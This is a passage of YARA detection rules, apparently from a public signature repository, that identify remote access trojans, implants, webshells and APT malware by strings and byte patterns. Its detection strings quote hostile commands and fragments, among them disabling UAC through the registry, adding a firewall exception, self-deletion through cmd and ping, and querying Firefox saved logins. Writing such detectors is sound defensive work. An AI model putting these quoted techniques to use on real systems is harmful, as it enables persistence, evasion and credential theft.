		logic_hash = "17a6be371ce0c616cfea0b42a30e6d9118376912002d59790b133c73fd5436a3"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$split1 = "!!<3SAFIA<3!!"
		$split2 = "!!ElMattadorDz!!"
		$a1 = "stub_2.Properties"
		$a2 = "stub.exe" wide
		$a3 = "get_CurrentDomain"

	condition:
		($split1 or $split2 ) and ( all of ( $a* ) )
}

rule SIGNATURE_BASE_RAT_Spygate
{
	meta:
		description = "Detects SpyGate RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "ed015770-81ff-5d9c-8bd0-3c225e400724"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/SpyGate"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L863-L890"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5b891212f3a669c6066cfddef418faafd75c92bb2f1e8e1f48403422a73bc9fa"
		score = 75
		quality = 83
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$split = "abccba"
		$a1 = "abccbaSpyGateRATabccba"
		$a2 = "StubX.pdb"
		$a3 = "abccbaDanabccb"
		$b1 = "monikerString" nocase
		$b2 = "virustotal1"
		$b3 = "get_CurrentDomain"
		$c1 = "shutdowncomputer" wide
		$c2 = "shutdown -r -t 00" wide
		$c3 = "set cdaudio door closed" wide
		$c4 = "FileManagerSplit" wide
		$c5 = "Chating With >> [~Hacker~]" wide

	condition:
		( all of ( $a* ) and #split > 40 ) or ( all of ( $b* ) and #split > 10 ) or ( all of ( $c* ) )
}

rule SIGNATURE_BASE_RAT_Sub7Nation
{
	meta:
		description = "Detects Sub7Nation RAT"
		author = "Kevin Breen <kevin@techanarchy.net> (slightly modified by Florian Roth to improve performance)"
		id = "4f41d649-4a90-566b-bda8-0a288380aeaa"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Sub7Nation"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L892-L913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bd6c423cd5cb5a86b20e5e65ab460904548b8814c92ac65e497757bb79a27681"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "EnableLUA /t REG_DWORD /d 0 /f"
		$i = "HostSettings"
		$verSpecific1 = "sevane.tmp"
		$verSpecific2 = "cmd_.bat"
		$verSpecific3 = "a2b7c3d7e4"
		$verSpecific4 = "cmd.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Vertex
{
	meta:
		description = "Detects Vertex RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "f6f5967e-6b88-5d95-8fe1-a286ee8ce64c"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Vertex"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L915-L938"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c9fb0dedd97240ad29924865118ba34f5d79dbefbb13729d96d41336ec4de39e"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string1 = "DEFPATH"
		$string2 = "HKNAME"
		$string3 = "HPORT"
		$string4 = "INSTALL"
		$string5 = "IPATH"
		$string6 = "MUTEX"
		$res1 = "PANELPATH"
		$res2 = "ROOTURL"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Virusrat
{
	meta:
		description = "Detects VirusRAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "ef00cec9-d09b-5010-8e7d-bb391c937f34"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/VirusRat"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L940-L967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8540296fe1341a793377494cec9ba6ee0313203bee9997f0da0b692959727c59"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string0 = "virustotal"
		$string1 = "virusscan"
		$string2 = "abccba"
		$string3 = "pronoip"
		$string4 = "streamWebcam"
		$string5 = "DOMAIN_PASSWORD"
		$string6 = "Stub.Form1.resources"
		$string7 = "ftp://{0}@{1}" wide
		$string8 = "SELECT * FROM moz_logins" wide
		$string9 = "SELECT * FROM moz_disabledHosts" wide
		$string10 = "DynDNS\\Updater\\config.dyndns" wide
		$string11 = "|BawaneH|" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Xtreme
{
	meta:
		description = "Detects Xtreme RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "02b7bb6a-5d1e-5379-b366-868680844719"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/Xtreme"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L969-L990"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4dec8de6609f8229444291a78e920ac48b9b5751dd0cad7c95bc6529d6f8c16c"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"
		ver = "2.9, 3.1, 3.2, 3.5"

	strings:
		$a = "XTREME" wide
		$b = "ServerStarted" wide
		$c = "XtremeKeylogger" wide
		$d = "x.html" wide
		$e = "Xtreme RAT" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Adwind
{
	meta:
		description = "Detects Adwind RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "95681c07-0e9c-5688-a8a0-899617521c7b"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/adWind"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L992-L1011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "11167b927fa06324950753c6ec8f28058f2aa66fb4ecdf66a21de11a8db190b8"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$meta = "META-INF"
		$conf = "config.xml"
		$a = "Adwind.class"
		$b = "Principal.adwind"

	condition:
		all of them
}

rule SIGNATURE_BASE_RAT_Njrat
{
	meta:
		description = "Detects njRAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "6289b9c8-eef6-5cfb-97bd-b819158d6fdd"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/njRat"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L1013-L1036"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "47e8cc71caaefd70a170eb8fc845cb7ddb8df04b90163fe35f1ccb9a3f614c57"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$s1 = {7C 00 27 00 7C 00 27 00 7C}
		$s2 = "netsh firewall add allowedprogram" wide
		$s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
		$s4 = "yyyy-MM-dd" wide
		$v1 = "cmd.exe /k ping 0 & del" wide
		$v2 = "cmd.exe /c ping 127.0.0.1 & del" wide
		$v3 = "cmd.exe /c ping 0 -n 2 & del" wide

	condition:
		all of ( $s* ) and any of ( $v* )
}

rule SIGNATURE_BASE_RAT_Unrecom
{
	meta:
		description = "Detects unrecom RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "56b11c22-f43c-5192-9a0a-0ac14b0cd041"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/unrecom"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L1038-L1058"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "15ab9ee2f3fd825e91813a185bc5c7d7e790de39cd3e88c375b801d1412a08f4"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$meta = "META-INF"
		$conf = "load/ID"
		$a = "load/JarMain.class"
		$b = "load/MANIFEST.MF"
		$c = "plugins/UnrecomServer.class"

	condition:
		all of them
}

rule SIGNATURE_BASE_Brc4_Shellcode
{
	meta:
		description = "Hunts for shellcode opcode used in Badger x86/x64 till release v1.2.9"
		author = "@ninjaparanoid"
		id = "7e899d2f-332b-53f7-b9e6-cfde2bce6223"
		date = "2022-11-19"
		modified = "2023-12-05"
		reference = "https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/brc4.yara"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/hktl_bruteratel_c4.yar#L263-L290"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a2816eb0316cebc96569847c17eae3bc50b988b07aa471176a09695fcefc21ec"
		score = 75
		quality = 83
		tags = ""
		version = "last version"
		arch_context = "x64"

	strings:
		$shellcode_x64_Start = { 55 50 53 51 52 56 57 41 50 41 51 41 52 41 53 41 54 41 55 41 56 41 57 }
		$shellcode_x64_End = { 5B 5E 5F 41 5C 41 5D 41 5E 41 5F 5D C3 }
		$shellcode_x64_StageEnd = { 5C 41 5F 41 5E 41 5D 41 5C 41 5B 41 5A 41 59 41 58 5F 5E 5A 59 5B 58 5D C3 }
		$funcHash1 = { 5B BC 4A 6A }
		$funcHash2 = { 5D 68 FA 3C }
		$funcHash3 = { AA FC 0D 7C }
		$funcHash4 = { 8E 4E 0E EC }
		$funcHash5 = { B8 12 DA 00 }
		$funcHash6 = { 07 C4 4C E5 }
		$funcHash7 = { BD CA 3B D3 }
		$funcHash8 = { 89 4D 39 8C }
		$hashFuncx64 = { EB 20 0F 1F 44 00 00 44 0F B6 C8 4C 89 DA 41 83 E9 20 4D 63 C1 4B 8D 04 10 49 39 CB 74 21 49 83 C3 01 41 89 C2 }
		$hashFuncx86 = { EB 07 8D 74 26 00 83 C2 01 0F B6 31 C1 C8 0D 89 F1 8D 5C 30 E0 01 F0 80 F9 61 89 D1 0F 43 C3 39 D7 75 E3 }

	condition:
		(pe.machine == pe.MACHINE_AMD64 and ( 2 of ( $shellcode* ) or all of ( $funcHash* ) and $hashFuncx64 ) ) or ( pe.machine == pe.MACHINE_I386 and ( all of ( $funcHash* ) and $hashFuncx86 ) )
}

rule SIGNATURE_BASE_Duqu1_5_Modules
{
	meta:
		description = "Detection for Duqu 1.5 modules"
		author = "Silas Cutler (havex@chronicle.security)"
		id = "7239f5e1-c08f-566c-8998-f7dacc2c4a29"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_duqu1_5_modules.yar#L2-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bb3961e2b473c22c3d5939adeb86819eb846ccd07f5736abb5e897918580aace"
		logic_hash = "795107e227cfb73f6ea09fcdb078f8b57a30d47a2cb702b2d47cc936dea5ae9f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$c1 = "%s(%d)disk(%d)fdisk(%d)"
		$c2 = "\\Device\\Floppy%d" wide
		$c3 = "BrokenAudio" wide
		$m1 = { 81 3F E9 18 4B 7E}
		$m2 = { 81 BC 18 F8 04 00 00 B3 20 EA B4 }

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_APT28_Generic_Poco_Openssl
{
	meta:
		description = "Rule to detect statically linked POCO and OpenSSL libraries (COULD be Drovorub related and should be further investigated)"
		author = "NSA / FBI"
		id = "b6d2477b-c9a2-5858-87cf-aa006109bc8f"
		date = "2020-08-13"
		modified = "2023-12-05"
		reference = "https://www.nsa.gov/news-features/press-room/Article/2311407/nsa-and-fbi-expose-russian-previously-undisclosed-malware-drovorub-in-cybersecu/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt28_drovorub.yar#L1-L21"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b6a78c358b3aee6b172ec29e72ce810c6fbf332f180d5879f0889f47688225e1"
		score = 50
		quality = 85
		tags = ""

	strings:
		$mw1 = { 89 F1 48 89 FE 48 89 D7 48 F7 C6 FF FF FF FF 0F 84 6B 02 00 00 48 F7 C7
                 FF FF FF FF 0F 84 5E 02 00 00 48 8D 2D }
		$mw2 = { 41 54 49 89 D4 55 53 F6 47 19 04 48 8B 2E 75 08 31 DB F6 45 00 03 75 }
		$mw3 = { 85C0BA15000000750989D05BC30F1F44 0000BE }
		$mw4 = { 53 8A 47 08 3C 06 74 21 84 C0 74 1D 3C 07 74 20 B9 ?? ?? ?? ?? BA FD 03 
                 00 00 BE ?? ?? ?? ?? BF ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 E8 06 3C 01 77 2B 48 8B 1F 48 8B 73 
                 10 48 89 DF E8 ?? ?? ?? ?? 48 8D 43 08 48 C7 43 10 00 00 00 00 48 C7 43 28 00 00 00 00 48 
                 89 43 18 48 89 43 20 5B C3 }

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_APT28_Drovorub_Unique_Network_Comms_Strings
{
	meta:
		description = "Rule to detect Drovorub-server, Drovorub-agent, or Drovorub-client based"
		author = "NSA / FBI"
		id = "c6a930e8-c1c0-5d96-9051-7516df848b45"
		date = "2020-08-13"
		modified = "2023-12-05"
		reference = "https://www.nsa.gov/news-features/press-room/Article/2311407/nsa-and-fbi-expose-russian-previously-undisclosed-malware-drovorub-in-cybersecu/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt28_drovorub.yar#L44-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "8c82766b76c36fe64c6aa99577e1997d7181dbd36a4c27329845ae8a413f5327"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_01 = "action" wide ascii
		$s_02 = "auth.commit" wide ascii
		$s_03 = "auth.hello" wide ascii
		$s_04 = "auth.login" wide ascii
		$s_05 = "auth.pending" wide ascii
		$s_06 = "client_id" wide ascii
		$s_07 = "client_login" wide ascii
		$s_08 = "client_pass" wide ascii
		$s_09 = "clientid" wide ascii
		$s_10 = "clientkey_base64" wide ascii
		$s_11 = "file_list_request" wide ascii
		$s_12 = "module_list_request" wide ascii
		$s_13 = "monitor" wide ascii
		$s_14 = "net_list_request" wide ascii
		$s_15 = "server finished" wide ascii
		$s_16 = "serverid" wide ascii
		$s_17 = "tunnel" wide ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_Proxyshell_Exploitation_Nov21_1
{
	meta:
		description = "Detects webshells dropped by DropHell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "300eaadf-db0c-5591-84fc-abdf7cdd90c1"
		date = "2021-11-01"
		modified = "2025-03-21"
		reference = "https://www.deepinstinct.com/blog/do-not-exchange-it-has-a-shell-inside"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_proxyshell.yar#L252-L266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d9812d3f53c346c4e318609e0c7de66811b27ffa7528a6ddeb6ac8436da59ef5"
		score = 85
		quality = 85
		tags = ""

	strings:
		$s01 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request[" ascii wide
		$s02 = "new System.IO.MemoryStream()" ascii wide
		$s03 = "Transform(" ascii wide

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Kaosrat_Yamabot
{
	meta:
		description = "Detects the KaosRAT variant"
		author = "CISA.gov"
		id = "cdde69cd-1b38-52f5-8552-cef2cf4ad69c"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_andariel_jul24.yar#L20-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "92182aac2e56041292102b0486b7de1ee6eb3d54a9fc6786c567acd92073cd84"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "/kaos/"
		$str2 = "Abstand ["
		$str3 = "] anwenden"
		$str4 = "cmVjYXB0Y2hh"
		$str5 = "/bin/sh"
		$str6 = "utilities.CIpaddress"
		$str7 = "engine.NewEgg"
		$str8 = "%s%04x%s%s%s"
		$str9 = "Y2FwdGNoYV9zZXNzaW9u"
		$str10 = "utilities.EierKochen"
		$str11 = "kandidatKaufhaus"

	condition:
		3 of them
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Golang_Validalpha_Handshake
{
	meta:
		description = "Detects a variant of the GoLang Validalpha malware"
		author = "CISA.gov"
		id = "51dafa43-9da0-569a-9123-7e9800284046"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_andariel_jul24.yar#L218-L230"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1978210d07d3298c0051c9faca16685636e3fb45131b4c2fcb7053a0b3ef84d1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = { 66 C7 00 AB CD C6 40 02 EF ?? 03 00 00 00 48 89 C1 ?? 03 00 00 00 }

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Golang_Validalpha_Tasks
{
	meta:
		description = "Detects a variant of the GoLang Validalpha malware"
		author = "CISA.gov"
		id = "caa67a79-3ea6-5910-971c-f311722570ff"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_andariel_jul24.yar#L232-L247"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0d3fb944888b289d345ffc8dfcc988abd04b8cabd1729a66e8236f95ee6147ee"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "main.ScreenMonitThread"
		$ = "main.CmdShell"
		$ = "main.GetAllFoldersAndFiles"
		$ = "main.SelfDelete"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shellcode_Apihashing_FIN8_1
{
	meta:
		description = "Detects FIN8 Shellcode APIHashing"
		author = "Frank Boldewin (@r3c0nst)"
		id = "bca5601c-2998-545b-8dd0-ec3c861e6291"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fin8.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5d47119a588aa69b3e241618d6dbb9df6117a6751bbff39a1f95340bc26611a7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$APIHashing32bit1 = {81 F7 99 5D 52 69 81 F3 30 D7 00 AB}
		$APIHashing32bit2 = {68 F2 55 03 88 68 65 19 6D 1E}
		$APIHashing32bit3 = {68 9B 59 27 21 C1 E9 17 33 4C 24 10 68 37 5C 32 F4}
		$APIHashing64bit1 = {49 BF 65 19 6D 1E F2 55 03 88 49 BE 37 5C 32 F4 9B 59 27 21}
		$APIHashing64bit2 = {48 B8 99 5D 52 69 30 D7 00 AB}

	condition:
		all of ( $APIHashing32bit* ) or all of ( $APIHashing64bit* )
}

rule SIGNATURE_BASE_SUSP_Email_Redirection_Spoofing_Feb25
{
	meta:
		description = "Detects redirect spoofing in embedded URLs. This technique is used by threat actors to obscure the actual destination of a link"
		author = "Jonathan Peters (cod3nym)"
		id = "bf3a2b06-4dc5-5f0f-bf1f-2bd6a1cc4a8d"
		date = "2025-02-20"
		modified = "2025-03-20"
		reference = "https://any.run/cybersecurity-blog/cyber-attacks-january-2025/#fake-youtube-links-redirect-users-to-phishing-pages-11298"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/susp_email_redirection_spoofing.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9b196220b369c199a7e4d57cb5db18b32eb2565a6f9190929c5c01ac4fa04ac8"
		hash = "c4eb35c1a1c10226bff9bb0c88ca516441208d193b4994eeb292a66e53a2cc04"
		hash = "e3b8ea03a472348814c6ac81088234836e627a1878ec36e46ce62526e1390935"
		logic_hash = "9a411317821751dc0873fe3163791115d1e19bc4d57119ed2ba513b444864032"
		score = 70
		quality = 85
		tags = ""

	strings:
		$sa1 = "Content-Transfer-Encoding:" ascii
		$sa2 = "Subject:" ascii
		$x = ".com%20%20%20%20%20%" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_Backdoor_SPAREPART_Sleepgenerator
{
	meta:
		description = "Detects the algorithm used to determine the next sleep timer"
		author = "Mandiant"
		id = "b9cd46e4-0e06-5ead-8379-adcfc3c384d0"
		date = "2022-12-14"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/mal_ru_sparepart_dec22.yar#L2-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f9cd5b145e372553dded92628db038d8"
		logic_hash = "41a9fdb2ba7aefcaf6ef2477b598e98b9045ef17ce9bfe46f3169d0b2e0dd289"
		score = 50
		quality = 85
		tags = ""
		version = "1"
		weight = "100"
		disclaimer = "This rule is meant for hunting and is not tested to run in a production environment."

	strings:
		$ = {C1 E8 06 89 [5] C1 E8 02 8B}
		$ = {c1 e9 03 33 c1 [3] c1 e9 05 33 c1 83 e0 01}
		$ = {8B 80 FC 00 00 00}
		$ = {D1 E8 [4] c1 E1 0f 0b c1}

	condition:
		all of them
}

rule SIGNATURE_BASE_Sliver_Implant_32Bit_1
{
	meta:
		description = "Sliver 32-bit implant (with and without --debug flag at compile)"
		author = "gssincla@google.com"
		id = "6bc4d7d1-64cf-5920-8f07-54a8a7a94f26"
		date = "2022-11-18"
		modified = "2025-03-21"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_gcti_sliver.yar#L26-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "911f4106350871ddb1396410d36f2d2eadac1166397e28a553b28678543a9357"
		logic_hash = "3fec6fbba86a24b395e58f02fb35a60b1b9a4b941b4d85c060cc6159c6aa8265"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_tcppivot = { 81 ?? 74 63 70 70 [2-20] 81 ?? 04 69 76 6F 74  }
		$s_wg = { 66 81 ?? 77 67 }
		$s_dns = { 66 81 ?? 64 6E [2-20] 80 ?? 02 73 }
		$s_http = { 81 ?? 68 74 74 70 }
		$s_https = { 81 ?? 68 74 74 70 [2-20] 80 ?? 04 73 }
		$s_mtls = { 81 ?? 6D 74 6C 73 }
		$fp1 = "cloudfoundry" ascii fullword
		$fp2 = "googleapi.Error" ascii

	condition:
		4 of ( $s* ) and not 1 of ( $fp* ) and not pe.number_of_signatures > 0
}

rule SIGNATURE_BASE_Sliver_Implant_64Bit_1
{
	meta:
		description = "Sliver 64-bit implant (with and without --debug flag at compile)"
		author = "gssincla@google.com"
		id = "b84db933-0e11-5871-821d-43697c015665"
		date = "2022-11-18"
		modified = "2025-03-21"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_gcti_sliver.yar#L112-L183"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2d1c9de42942a16c88a042f307f0ace215cdc67241432e1152080870fe95ea87"
		logic_hash = "ccfd944a5bc6521c89d44572910e2998e2404d472a593f9d97224d606d247bcd"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s_tcppivot = { 48 ?? 74 63 70 70 69 76 6F 74 }
		$s_namedpipe = { 48 ?? 6E 61 6D 65 64 70 69 70 [2-32] 80 ?? 08 65 }
		$s_https = { 81 ?? 68 74 74 70 [2-32] 80 ?? 04 73 }
		$s_wg = {66 81 ?? 77 67}
		$s_dns = { 66 81 ?? 64 6E [2-20] 80 ?? 02 73 }
		$s_mtls = {  81 ?? 6D 74 6C 73  }
		$fp1 = "cloudfoundry" ascii fullword
		$fp2 = "googleapi.Error" ascii

	condition:
		5 of ( $s* ) and not 1 of ( $fp* ) and not pe.number_of_signatures > 0
}

rule SIGNATURE_BASE_APT_MAL_NK_3CX_Malicious_Samples_Mar23_3
{
	meta:
		description = "Detects malicious DLLs related to 3CX compromise (decrypted payload)"
		author = "Florian Roth , X__Junior (Nextron Systems)"
		id = "d2d361b6-8485-57eb-b6eb-88785f42e93e"
		date = "2023-03-29"
		modified = "2023-12-05"
		reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_3cx_compromise_mar23.yar#L56-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "adfe04904d796690631e5841ee1ee10c767f9f4c340e5b9df78918e981359d4d"
		score = 80
		quality = 85
		tags = ""
		hash1 = "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973"

	strings:
		$opa1 = { 41 81 C0 ?? ?? ?? ?? 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1 41 69 D0 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 ?? ?? ?? ?? 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 }
		$opa2 = { 8B C8 41 69 D1 ?? ?? ?? ?? C1 E1 ?? 33 C1 45 8B CA 8B C8 C1 E9 ?? 33 C1 81 C2 ?? ?? ?? ?? 8B C8 C1 E1 ?? 33 C1 41 8B C8 4C 0F AF CF 44 69 C2 ?? ?? ?? ?? 4C 03 C9 45 8B D1 4C 0F AF D7}
		$opb1 = { 45 33 C9 48 89 6C 24 ?? 48 8D 44 24 ?? 48 89 6C 24 ?? 8B D3 48 89 B4 24 ?? ?? ?? ?? 48 89 44 24 ?? 45 8D 41 ?? FF 15 }
		$opb2 = { 44 8B 0F 45 8B C6 48 8B 4D ?? 49 8B D7 44 89 64 24 ?? 48 89 7C 24 ?? 44 89 4C 24 ?? 4C 8D 4D ?? 48 89 44 24 ?? 44 89 64 24 ?? 4C 89 64 24 ?? FF 15}
